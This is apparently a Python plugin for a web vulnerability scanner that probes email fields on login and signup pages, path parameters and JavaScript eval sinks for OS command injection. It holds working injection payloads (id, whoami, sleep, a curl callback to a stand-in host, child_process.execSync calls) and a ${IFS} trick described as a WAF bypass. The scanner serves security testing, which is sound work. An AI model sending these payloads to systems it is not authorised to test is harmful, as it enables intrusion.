"""
Email Field RCE Detector

Detects Remote Code Execution via email/mail input fields on sign-in/sign-up pages.
Techniques:
- SSRF via email field (collaborator-style callback URLs)
- Command injection via email field using ${IFS} for spaces
- Blind OS injection (time-based detection)
- &path= parameter OS command injection
- JS framework RCE patterns (child_process.execSync)
"""

import logging
import re
import time
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

from scanner.scan_plugins.base_scan_plugin import BaseScanPlugin, VulnerabilityFinding

try:
    from scanner.scan_plugins.vpoc import (
        VPoCEvidence,
        capture_request_response_evidence,
        build_curl_command,
        redact_sensitive_headers,
        truncate_body,
    )
    HAS_VPOC = True
except ImportError:
    HAS_VPOC = False

logger = logging.getLogger(__name__)

# Sign-in/sign-up page indicators
SIGNUP_PATH_PATTERNS = re.compile(
    r'/(sign[_-]?up|sign[_-]?in|login|register|signup|account/new|auth|join|create[_-]?account)',
    re.IGNORECASE,
)

# Command injection payloads using ${IFS} instead of spaces.
# ${IFS} is the Internal Field Separator variable in bash, which defaults to
# space/tab/newline. Using it instead of literal spaces or %20 bypasses WAF
# rules and URL encoding filters that block space characters in command payloads.
# NEVER use %20 for spaces in OS command payloads.
EMAIL_CMD_PAYLOADS = [
    # Pipe-chain variants
    'test@x]||ping${IFS}-c${IFS}5${IFS}127.0.0.1||',
    'test@x]||sleep${IFS}5||',
    'test@x]||id||',
    'test@x]||whoami||',
    # Quoted id injection
    '"|id"@example.com',
    '"$(id)"@example.com',
    '"`id`"@example.com',
    # Curl callback
    'test@x]||curl${IFS}http://callback.example.com||',
    # Semicolon variants
    'test+;sleep${IFS}5;@example.com',
    'test|sleep${IFS}5|@example.com',
    # Backtick
    '"`sleep${IFS}5`"@example.com',
    '"`ping${IFS}-c${IFS}5${IFS}127.0.0.1`"@example.com',
]

# Time-based (blind) OS injection payloads
BLIND_TIME_PAYLOADS = [
    'test@x]||sleep${IFS}5||',
    'test+;sleep${IFS}5;@example.com',
    '"`sleep${IFS}5`"@example.com',
    'test|sleep${IFS}5|@example.com',
]

# Path parameter OS command injection payloads (for &path= style params)
PATH_CMD_PAYLOADS = [
    '|id||',
    '|whoami||',
    '||id||',
    '||whoami||',
    ';id;',
    '`id`',
    '$(id)',
]

# JS framework RCE via template/sink parameters
JS_RCE_PAYLOADS = [
    "process.mainModule.require('child_process').execSync('id').toString()",
    "require('child_process').execSync('id').toString()",
    "global.process.mainModule.require('child_process').execSync('id').toString()",
]

# Output indicators of successful command execution
CMD_OUTPUT_INDICATORS = [
    'uid=',
    'root:',
    'www-data',
    'daemon:',
    '/bin/bash',
    '/bin/sh',
    'Linux',
    'command not found',
    'ping: ',
    'PING ',
]

TIMING_THRESHOLD = 4.0  # seconds (margin for 5-second sleep)


class EmailRCEDetectorPlugin(BaseScanPlugin):
    """
    Email Field RCE vulnerability detection plugin.

    Detects RCE via email/mail input fields using:
    - SSRF escalation via email callback
    - ${IFS}-based command injection in email fields
    - Blind time-based OS injection
    - Path parameter injection (|id|| style)
    - JS framework RCE via parseData/sink parameters
    """

    @property
    def plugin_id(self) -> str:
        return 'email_rce_detector'

    @property
    def name(self) -> str:
        return 'Email Field RCE Detector'

    @property
    def description(self) -> str:
        return (
            'Detects Remote Code Execution vulnerabilities via email/mail input fields '
            'on login/signup pages using ${IFS}-based command injection and time-based detection'
        )

    @property
    def version(self) -> str:
        return '1.0.0'

    @property
    def vulnerability_types(self) -> List[str]:
        return ['email_rce', 'rce']

    def scan(self, url: str, config: Optional[Dict[str, Any]] = None) -> List[VulnerabilityFinding]:
        """
        Scan for email field RCE vulnerabilities.

        Args:
            url: Target URL to scan
            config: Configuration dictionary

        Returns:
            List of vulnerability findings
        """
        if not HAS_REQUESTS:
            logger.warning("requests library not available")
            return []

        config = config or self.get_default_config()
        findings = []

        try:
            verify_ssl = config.get('verify_ssl', False)
            timeout = config.get('timeout', 10)

            # Step 1: Discover forms with email fields
            email_forms = self._discover_email_forms(url, verify_ssl, timeout)

            if not email_forms:
                # Also check common login/signup paths
                for path in ['/login', '/signin', '/sign-in', '/register', '/signup', '/sign-up']:
                    parsed = urlparse(url)
                    candidate = f"{parsed.scheme}://{parsed.netloc}{path}"
                    forms = self._discover_email_forms(candidate, verify_ssl, timeout)
                    email_forms.extend(forms)

            # Step 2: Test command injection via email fields in discovered forms
            for form_info in email_forms:
                form_findings = self._test_email_command_injection(
                    form_info, verify_ssl, timeout
                )
                findings.extend(form_findings)

            # Step 3: Test path/query parameters for OS command injection
            path_findings = self._test_path_parameter_injection(url, verify_ssl, timeout)
            findings.extend(path_findings)

            # Step 4: Test JS framework RCE patterns in query parameters
            js_findings = self._test_js_framework_rce(url, verify_ssl, timeout)
            findings.extend(js_findings)

            logger.info(f"Email RCE scan of {url} found {len(findings)} potential issue(s)")

        except Exception as e:
            logger.error(f"Unexpected error during email RCE scan of {url}: {e}")

        return findings

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _discover_email_forms(
        self, url: str, verify_ssl: bool, timeout: int
    ) -> List[Dict[str, Any]]:
        """Discover HTML forms that contain email input fields."""
        forms = []
        try:
            response = requests.get(
                url,
                timeout=timeout,
                verify=verify_ssl,
                allow_redirects=True,
            )
            if not response.ok:
                return forms

            if not HAS_BS4:
                # Simple regex fallback
                email_inputs = re.findall(
                    r'<input[^>]+type=["\']?email["\']?[^>]*>',
                    response.text,
                    re.IGNORECASE,
                )
                if email_inputs:
                    forms.append({
                        'url': url,
                        'method': 'POST',
                        'fields': {'email': ''},
                        'action': url,
                    })
                return forms

            soup = BeautifulSoup(response.text, 'html.parser')
            for form in soup.find_all('form'):
                email_field = form.find('input', {'type': 'email'})
                if not email_field:
                    email_field = form.find(
                        'input', {'name': re.compile(r'(email|mail|user)', re.IGNORECASE)}
                    )
                if not email_field:
                    continue

                action = form.get('action', url)
                if not action.startswith('http'):
                    action = urljoin(url, action)
                method = form.get('method', 'post').upper()

                fields: Dict[str, str] = {}
                for inp in form.find_all('input'):
                    name = inp.get('name', '')
                    if not name:
                        continue
                    inp_type = inp.get('type', 'text').lower()
                    if inp_type == 'email':
                        fields[name] = 'test@example.com'
                    elif inp_type == 'password':
                        fields[name] = 'Password123!'
                    elif inp_type not in ('submit', 'button', 'image', 'reset', 'checkbox', 'radio'):
                        fields[name] = inp.get('value', 'test')

                email_field_name = email_field.get('name', 'email')
                forms.append({
                    'url': url,
                    'action': action,
                    'method': method,
                    'fields': fields,
                    'email_field': email_field_name,
                })
        except Exception as e:
            logger.debug(f"Error discovering email forms at {url}: {e}")
        return forms

    def _test_email_command_injection(
        self, form_info: Dict[str, Any], verify_ssl: bool, timeout: int
    ) -> List[VulnerabilityFinding]:
        """Test command injection payloads in email form fields."""
        findings = []
        action = form_info['action']
        method = form_info['method']
        email_field = form_info.get('email_field', 'email')

        # Baseline timing
        try:
            baseline_fields = dict(form_info['fields'])
            if method == 'POST':
                baseline_resp = requests.post(
                    action, data=baseline_fields, timeout=timeout, verify=verify_ssl
                )
            else:
                baseline_resp = requests.get(
                    action, params=baseline_fields, timeout=timeout, verify=verify_ssl
                )
            baseline_time = baseline_resp.elapsed.total_seconds()
        except Exception:
            baseline_time = 1.0

        # Test output-based payloads first
        for payload in EMAIL_CMD_PAYLOADS:
            test_fields = dict(form_info['fields'])
            test_fields[email_field] = payload
            try:
                if method == 'POST':
                    resp = requests.post(
                        action, data=test_fields, timeout=timeout, verify=verify_ssl
                    )
                else:
                    resp = requests.get(
                        action, params=test_fields, timeout=timeout, verify=verify_ssl
                    )

                # Check for command output in response
                resp_lower = resp.text.lower()
                for indicator in CMD_OUTPUT_INDICATORS:
                    if indicator.lower() in resp_lower:
                        vpoc = None
                        if HAS_VPOC:
                            vpoc = capture_request_response_evidence(
                                resp,
                                plugin_name=self.plugin_id,
                                payload=payload,
                                confidence=0.95,
                                target_url=action,
                                reproduction_steps=(
                                    f"1. Navigate to {action}\n"
                                    f"2. Set the '{email_field}' field to: {payload}\n"
                                    f"3. Submit the form\n"
                                    f"4. Observe command output '{indicator}' in the response"
                                ),
                            )

                        req_headers = dict(resp.request.headers) if resp.request else {}
                        req_body = (
                            resp.request.body if resp.request and resp.request.body
                            else '&'.join(f'{k}={v}' for k, v in test_fields.items())
                        )
                        repeater_entry = {
                            'url': action,
                            'method': method,
                            'headers': req_headers,
                            'body': str(req_body)[:500] if req_body else '',
                            'description': f'Email RCE detection: {payload[:80]}',
                            'response': {
                                'status_code': resp.status_code,
                                'headers': dict(resp.headers),
                                'body': resp.text[:500],
                            },
                        }
                        http_traffic = {
                            'request': {
                                'method': method,
                                'url': action,
                                'headers': req_headers,
                                'body': str(req_body)[:500] if req_body else '',
                            },
                            'response': {
                                'status_code': resp.status_code,
                                'headers': dict(resp.headers),
                                'body': resp.text[:500],
                            },
                        }

                        finding = VulnerabilityFinding(
                            vulnerability_type='email_rce',
                            severity='critical',
                            url=action,
                            description=(
                                f'Email field command injection confirmed: command output '
                                f'("{indicator}") found in response'
                            ),
                            evidence=(
                                f'Payload: {payload}\n'
                                f'Field: {email_field}\n'
                                f'Indicator found: {indicator}\n'
                                f'Response snippet: {resp.text[:500]}'
                            ),
                            remediation=(
                                'Never pass email field values to OS commands or shell interpreters. '
                                'Validate email format strictly using RFC 5321 rules before processing.'
                            ),
                            parameter=email_field,
                            confidence=0.95,
                            cwe_id='CWE-78',
                            verified=True,
                            successful_payloads=[payload],
                            vpoc=vpoc,
                            repeater_requests=[repeater_entry],
                            http_traffic=http_traffic,
                        )
                        findings.append(finding)
                        logger.info(f"Confirmed email field RCE at {action} via {email_field}")
                        return findings  # One confirmed finding is enough

            except requests.Timeout:
                pass
            except Exception as e:
                logger.debug(f"Error testing email injection payload '{payload}': {e}")

        # Test time-based (blind) payloads
        for payload in BLIND_TIME_PAYLOADS:
            test_fields = dict(form_info['fields'])
            test_fields[email_field] = payload
            try:
                start = time.time()
                if method == 'POST':
                    resp = requests.post(
                        action,
                        data=test_fields,
                        timeout=timeout + 10,
                        verify=verify_ssl,
                    )
                else:
                    resp = requests.get(
                        action,
                        params=test_fields,
                        timeout=timeout + 10,
                        verify=verify_ssl,
                    )
                elapsed = time.time() - start

                if elapsed > baseline_time + TIMING_THRESHOLD:
                    vpoc = None
                    if HAS_VPOC:
                        vpoc = capture_request_response_evidence(
                            resp,
                            plugin_name=self.plugin_id,
                            payload=payload,
                            confidence=0.85,
                            target_url=action,
                            reproduction_steps=(
                                f"1. Navigate to {action}\n"
                                f"2. Set the '{email_field}' field to: {payload}\n"
                                f"3. Submit the form\n"
                                f"4. Observe delayed response ({elapsed:.1f}s vs baseline {baseline_time:.1f}s)"
                            ),
                        )

                    req_headers = dict(resp.request.headers) if resp.request else {}
                    req_body = (
                        resp.request.body if resp.request and resp.request.body
                        else '&'.join(f'{k}={v}' for k, v in test_fields.items())
                    )
                    repeater_entry = {
                        'url': action,
                        'method': method,
                        'headers': req_headers,
                        'body': str(req_body)[:500] if req_body else '',
                        'description': f'Time-based RCE detection: {payload[:80]} ({elapsed:.2f}s delay)',
                        'response': {
                            'status_code': resp.status_code,
                            'headers': dict(resp.headers),
                            'body': resp.text[:300],
                            'elapsed_seconds': elapsed,
                        },
                    }
                    http_traffic = {
                        'request': {
                            'method': method,
                            'url': action,
                            'headers': req_headers,
                            'body': str(req_body)[:500] if req_body else '',
                        },
                        'response': {
                            'status_code': resp.status_code,
                            'headers': dict(resp.headers),
                            'body': resp.text[:300],
                            'elapsed_seconds': elapsed,
                        },
                    }

                    finding = VulnerabilityFinding(
                        vulnerability_type='email_rce',
                        severity='critical',
                        url=action,
                        description=(
                            f'Blind time-based email field command injection detected: '
                            f'response delayed {elapsed:.1f}s (baseline {baseline_time:.1f}s)'
                        ),
                        evidence=(
                            f'Payload: {payload}\n'
                            f'Field: {email_field}\n'
                            f'Response time: {elapsed:.2f}s, baseline: {baseline_time:.2f}s'
                        ),
                        remediation=(
                            'Never pass email field values to OS commands. '
                            'Validate and sanitize all user input before processing.'
                        ),
                        parameter=email_field,
                        confidence=0.85,
                        cwe_id='CWE-78',
                        verified=False,
                        successful_payloads=[payload],
                        vpoc=vpoc,
                        repeater_requests=[repeater_entry],
                        http_traffic=http_traffic,
                    )
                    findings.append(finding)
                    logger.info(f"Found time-based email injection at {action}")
                    break

            except requests.Timeout:
                finding = VulnerabilityFinding(
                    vulnerability_type='email_rce',
                    severity='high',
                    url=action,
                    description='Possible blind OS command injection in email field (request timed out)',
                    evidence=f'Payload: {payload}\nField: {email_field}\nRequest timed out',
                    remediation='Validate and sanitize all user input in email fields.',
                    parameter=email_field,
                    confidence=0.6,
                    cwe_id='CWE-78',
                )
                findings.append(finding)
                break
            except Exception as e:
                logger.debug(f"Error testing blind time-based payload '{payload}': {e}")

        return findings

    def _test_path_parameter_injection(
        self, url: str, verify_ssl: bool, timeout: int
    ) -> List[VulnerabilityFinding]:
        """Test &path= and similar parameters for OS command injection."""
        findings = []
        try:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            # Test path parameter variants
            param_names = ['path', 'file', 'dir', 'folder', 'location']
            for param_name in param_names:
                for payload in PATH_CMD_PAYLOADS:
                    test_url = f"{base}?{param_name}={payload}"
                    try:
                        resp = requests.get(
                            test_url, timeout=timeout, verify=verify_ssl
                        )
                        resp_lower = resp.text.lower()
                        for indicator in CMD_OUTPUT_INDICATORS:
                            if indicator.lower() in resp_lower:
                                vpoc = None
                                if HAS_VPOC:
                                    vpoc = capture_request_response_evidence(
                                        resp,
                                        plugin_name=self.plugin_id,
                                        payload=payload,
                                        confidence=0.9,
                                        target_url=url,
                                        reproduction_steps=(
                                            f"1. Send GET request to: {test_url}\n"
                                            f"2. Observe command output in response"
                                        ),
                                    )
                                req_headers = dict(resp.request.headers) if resp.request else {}
                                repeater_entry = {
                                    'url': test_url,
                                    'method': 'GET',
                                    'headers': req_headers,
                                    'body': '',
                                    'description': f'Path param injection: {param_name}={payload}',
                                    'response': {
                                        'status_code': resp.status_code,
                                        'headers': dict(resp.headers),
                                        'body': resp.text[:500],
                                    },
                                }
                                http_traffic = {
                                    'request': {
                                        'method': 'GET',
                                        'url': test_url,
                                        'headers': req_headers,
                                    },
                                    'response': {
                                        'status_code': resp.status_code,
                                        'headers': dict(resp.headers),
                                        'body': resp.text[:500],
                                    },
                                }
                                finding = VulnerabilityFinding(
                                    vulnerability_type='email_rce',
                                    severity='critical',
                                    url=url,
                                    description=(
                                        f'OS command injection in path parameter "{param_name}": '
                                        f'command output detected in response'
                                    ),
                                    evidence=(
                                        f'URL: {test_url}\n'
                                        f'Payload: {payload}\n'
                                        f'Indicator: {indicator}\n'
                                        f'Response: {resp.text[:500]}'
                                    ),
                                    remediation=(
                                        'Never pass URL parameters directly to OS commands. '
                                        'Use parameterized APIs and strict input validation.'
                                    ),
                                    parameter=param_name,
                                    confidence=0.9,
                                    cwe_id='CWE-78',
                                    verified=True,
                                    successful_payloads=[payload],
                                    vpoc=vpoc,
                                    repeater_requests=[repeater_entry],
                                    http_traffic=http_traffic,
                                )
                                findings.append(finding)
                                return findings
                    except Exception as e:
                        logger.debug(f"Error testing path injection: {e}")
        except Exception as e:
            logger.error(f"Error in path parameter injection testing: {e}")
        return findings

    def _test_js_framework_rce(
        self, url: str, verify_ssl: bool, timeout: int
    ) -> List[VulnerabilityFinding]:
        """Test JS framework RCE patterns via parseData or similar sink parameters."""
        findings = []
        try:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            sink_params = ['parseData', 'data', 'input', 'template', 'render', 'eval']
            for param_name in sink_params:
                for payload in JS_RCE_PAYLOADS:
                    test_url = f"{base}?{param_name}={requests.utils.quote(payload)}"
                    try:
                        resp = requests.get(
                            test_url, timeout=timeout, verify=verify_ssl
                        )
                        # Look for output indicators suggesting JS eval
                        resp_lower = resp.text.lower()
                        for indicator in CMD_OUTPUT_INDICATORS:
                            if indicator.lower() in resp_lower:
                                vpoc = None
                                if HAS_VPOC:
                                    vpoc = capture_request_response_evidence(
                                        resp,
                                        plugin_name=self.plugin_id,
                                        payload=payload,
                                        confidence=0.95,
                                        target_url=url,
                                        reproduction_steps=(
                                            f"1. Send GET request to: {test_url}\n"
                                            f"2. Observe command output from JS execSync in response"
                                        ),
                                    )
                                req_headers = dict(resp.request.headers) if resp.request else {}
                                repeater_entry = {
                                    'url': test_url,
                                    'method': 'GET',
                                    'headers': req_headers,
                                    'body': '',
                                    'description': f'JS framework RCE: {param_name}={payload[:60]}',
                                    'response': {
                                        'status_code': resp.status_code,
                                        'headers': dict(resp.headers),
                                        'body': resp.text[:500],
                                    },
                                }
                                http_traffic = {
                                    'request': {
                                        'method': 'GET',
                                        'url': test_url,
                                        'headers': req_headers,
                                    },
                                    'response': {
                                        'status_code': resp.status_code,
                                        'headers': dict(resp.headers),
                                        'body': resp.text[:500],
                                    },
                                }
                                finding = VulnerabilityFinding(
                                    vulnerability_type='email_rce',
                                    severity='critical',
                                    url=url,
                                    description=(
                                        f'JS framework RCE via "{param_name}" parameter: '
                                        f'child_process.execSync output detected'
                                    ),
                                    evidence=(
                                        f'URL: {test_url}\n'
                                        f'Payload: {payload}\n'
                                        f'Indicator: {indicator}\n'
                                        f'Response: {resp.text[:500]}'
                                    ),
                                    remediation=(
                                        'Never evaluate user-controlled data as JS code. '
                                        'Disable eval() and similar constructs in production.'
                                    ),
                                    parameter=param_name,
                                    confidence=0.95,
                                    cwe_id='CWE-78',
                                    verified=True,
                                    successful_payloads=[payload],
                                    vpoc=vpoc,
                                    repeater_requests=[repeater_entry],
                                    http_traffic=http_traffic,
                                )
                                findings.append(finding)
                                return findings
                    except Exception as e:
                        logger.debug(f"Error testing JS RCE: {e}")
        except Exception as e:
            logger.error(f"Error in JS framework RCE testing: {e}")
        return findings

    def get_default_config(self) -> Dict[str, Any]:
        """Return default configuration for email RCE scanning."""
        return {
            'verify_ssl': False,
            'timeout': 10,
            'test_command_injection': True,
            'test_time_based': True,
            'test_path_injection': True,
            'test_js_rce': True,
        }
